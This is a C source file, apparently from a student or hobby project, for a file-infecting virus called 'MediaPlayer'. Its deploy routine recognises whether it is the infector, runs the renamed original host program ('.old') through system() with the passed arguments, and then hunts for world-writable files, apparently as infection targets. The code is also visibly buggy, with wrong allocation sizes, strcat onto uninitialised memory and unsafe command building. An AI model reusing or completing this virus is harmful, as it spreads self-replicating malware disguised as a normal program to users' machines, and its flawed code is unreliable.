#include <stdio.h>
#include <string.h>
#include "malwareBuilder.h"
#include "malwareUtils.h"


MalwareBuilder *malwareBuilder_create(char *defaultRepository,char *defaultExtensionName,char *malwareName){
    
    MalwareBuilder *malware = malloc(sizeof(malware));
    if(malware == NULL) {
        fprintf(stderr, "Failed to allocate memory for Malware\n");
        return NULL;
    }

    malware->defaultRepository = strdup(defaultRepository);
    malware->defaultExtensionName = strdup(defaultExtensionName);
    malware->malwareName = strdup(malwareName);
    char *malwareFullPath = malloc(strlen(getUserCurentDir() + strlen(malwareName) + 1));
    strcpy(malwareFullPath, getUserCurentDir());
    strcat(malwareFullPath, "/");
    strcat(malwareFullPath, malwareName);
    malware->malwarePath = strdup(malwareFullPath);
    //printf("%s,%s,%s\n",malware->defaultRepository,malware->defaultExtensionName,malware->malwareName);
    return malware;
}

void malwareBuilder_destroy(MalwareBuilder *app);

void malwareBuilder_deploy(int argc, char *argv[])
{
    MalwareBuilder *malware = malwareBuilder_create(getUserCurentDir(),".old","MediaPlayer");

    //printf("matching_filename = %s\n",strstr(argv[0], malware->malwareName));
    if(strstr(argv[0], malware->malwareName) != NULL){
        printf("Je suis l'infecteur\n");
    }
    else{
        char *token;
        token = strtok (argv[0],".");
        char *lastToken ;
        while (token != NULL)
        {
            lastToken = token ;
            token = strtok (NULL, ".");
        }
        
        char *file_path_sain = malloc(strlen(malware->malwarePath) + argc*sizeof(char) + 9 );
        strcat(file_path_sain, getUserCurentDir());
        strcat(file_path_sain, lastToken);
        strcat(file_path_sain, ".old ");

        for(int i = 1; i < argc; i++){
            strcat(file_path_sain, argv[i]);
            strcat(file_path_sain, "  ");

            printf("file_path_sain = %s\n",argv[i]);
        
        }
            
        
        system(file_path_sain);
        free(file_path_sain);
    }
    getUserWorldWritableFiles(malware);
}